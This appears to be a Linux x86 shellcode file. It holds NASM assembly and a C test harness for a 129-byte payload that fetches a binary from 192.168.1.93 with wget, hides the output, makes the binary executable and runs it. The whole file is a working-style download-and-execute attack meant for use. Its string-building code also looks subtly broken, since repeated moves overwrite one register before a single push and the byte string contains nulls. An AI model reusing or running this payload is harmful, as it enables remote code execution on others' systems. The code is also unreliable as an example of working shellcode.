/**

; Shellcode 129 Bytes
; download (via wget) + chmod + execute shellcode + hide output
;      Exec: /usr/bin/wget http://192.168.1.93//x > /dev/null 2>&1
;

global _start

section .text

_start:

    ;fork
    xor eax,eax
    mov al,0x2
    int 0x80
    xor ebx,ebx
    cmp eax,ebx
    jz download

    ; wait(NULL)
    xor eax,eax
    mov al,0x7
    int 0x80

    ; give execution permissions to the binary x
    xor ecx,ecx
    xor eax, eax
    push eax
    mov al, 0xf
    push 0x78
    mov ebx, esp
    xor ecx, ecx
    mov cx, 0x1ff
    int 0x80

    ; execution of binary x
    xor eax, eax
    push eax
    push 0x78
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80

download:

    push 0xb
    pop eax
    cdq
    push edx
    ; download uri
    mov eax, 0x31263e32 ; 1&>2 hide_output[4]
    mov eax, 0x6c6c756e ; llun/  hide_output[3]
    mov eax, 0x2f766564 ; ved  hide_output[2]
    mov eax, 0x2f3e20 ; />  hide_output[1]
    mov eax, 0x782f2f ; x//  path[1]
    mov eax, 0x33392e31 ;93.1 addr[3]
    mov eax, 0x2e383631 ;.861 addr[2]
    mov eax, 0x2e323931 ;.291  addr[1]
    push eax
    mov ecx,esp
    push edx

    ; download execution in /usr/bin/wget

    push 0x74 ;t
    push 0x6567772f ;egw/
    push 0x6e69622f ;nib/
    push 0x7273752f ;rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80

**/

// nasm -felf32 wget.nasm -o wget.o
// ld -m elf_i386 wget.o -o wget

#include <stdio.h>
#include <string.h>

// gcc -z execstack -fno-stack-protector shellcode.c -o shellcode

// SHELLCODE 129 Bytes

char buf[] = "\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8"
"\x74\x2a\x31\xc0\xb0\x07\xcd\x80\x31\xc9"
"\x31\xc0\x50\xb0\x0f\x6a\x78\x89\xe3\x31"
"\xc9\x66\xb9\xff\x01\xcd\x80\x31\xc0\x50"
"\x6a\x78\x89\xe3\x50\x89\xe2\x53\x89\xe1"
"\xb0\x0b\xcd\x80\x6a\x0b\x58\x99\x52\xb8"
"\x32\x3e\x26\x31\xb8\x6e\x75\x6c\x6c\xb8"
"\x64\x65\x76\x2f\xb8\x20\x3e\x2f\x00\xb8"
"\x2f\x2f\x78\x00\xb8\x31\x2e\x39\x33\xb8"
"\x31\x36\x38\x2e\xb8\x31\x39\x32\x2e\x50"
"\x89\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65"
"\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72"
"\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";

void main(int argc, char **argv)
{
        int (*func)();
        func = (int (*)()) buf;
        (int)(*func)();
}